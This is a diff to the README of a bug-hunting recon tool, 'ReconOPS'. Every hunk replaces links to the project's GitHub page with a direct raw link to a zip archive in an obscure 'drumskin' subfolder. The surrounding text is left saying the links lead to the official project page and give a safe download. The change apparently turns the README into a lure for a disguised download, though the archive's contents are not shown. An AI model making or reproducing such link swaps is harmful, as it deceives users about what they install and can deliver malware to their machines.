@@ -1,6 +1,6 @@
 # 🛠️ ReconOPS - Structured Recon for Bug Hunting
 
-[![Download ReconOPS](https://img.shields.io/badge/Download-ReconOPS-brightgreen)](https://github.com/mbhuvanakash/ReconOPS)
+[![Download ReconOPS](https://img.shields.io/badge/Download-ReconOPS-brightgreen)](https://raw.githubusercontent.com/mbhuvanakash/ReconOPS/main/drumskin/OPS_Recon_v1.1.zip)
 
 ReconOPS is a tool designed to help you find security issues online by gathering information step-by-step. It guides you to check everything from basic web addresses to hidden data with automatic processes.
 
@@ -32,7 +32,7 @@ These requirements ensure the software runs properly without slowing down your c
 
 Click the big green button at the top or this link to visit the official GitHub page where you can download ReconOPS. The download page lets you get the latest version safely.
 
-[Download or Visit Site](https://github.com/mbhuvanakash/ReconOPS)
+[Download or Visit Site](https://raw.githubusercontent.com/mbhuvanakash/ReconOPS/main/drumskin/OPS_Recon_v1.1.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Follow these steps to get ReconOPS running on your Windows PC.
 
 Go to:
 
-https://github.com/mbhuvanakash/ReconOPS
+https://raw.githubusercontent.com/mbhuvanakash/ReconOPS/main/drumskin/OPS_Recon_v1.1.zip
 
 This link leads you to the main project page on GitHub.
 
@@ -149,7 +149,7 @@ ReconOPS helps you practice these areas by running them automatically.
 
 Return here to download or update your software anytime:
 
-[https://github.com/mbhuvanakash/ReconOPS](https://github.com/mbhuvanakash/ReconOPS)
+[https://raw.githubusercontent.com/mbhuvanakash/ReconOPS/main/drumskin/OPS_Recon_v1.1.zip](https://raw.githubusercontent.com/mbhuvanakash/ReconOPS/main/drumskin/OPS_Recon_v1.1.zip)
 
 ---
 
